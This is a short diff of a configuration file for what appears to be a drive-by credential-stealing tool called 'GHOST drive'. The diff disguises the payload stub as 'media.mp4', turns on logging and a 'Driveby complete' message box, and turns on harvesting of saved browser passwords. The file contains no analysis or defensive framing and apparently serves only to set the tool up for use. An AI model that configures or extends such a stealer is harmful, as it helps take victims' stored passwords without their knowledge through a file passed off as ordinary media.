@@ -2,12 +2,12 @@
 exec_mode = "normal"
 uac_elevation = 0
 duplicate_exec = 1
-stub = "media.txt"
-logging = 0
+stub = "media.mp4"
+logging = 1
 
 # ->completion controls
 msgbox = {
-    'controller': 0,
+    'controller': 1,
     'title': "GHOST drive",
     'msg': "Driveby complete",
     'buttons': 0
@@ -20,7 +20,7 @@ power = {
 }
 
 # ->password recovery
-browser_pwds = 0
+browser_pwds = 1
 wireless_keys = 0
 email_pst_pwds = 0
 mail_pwds = 0
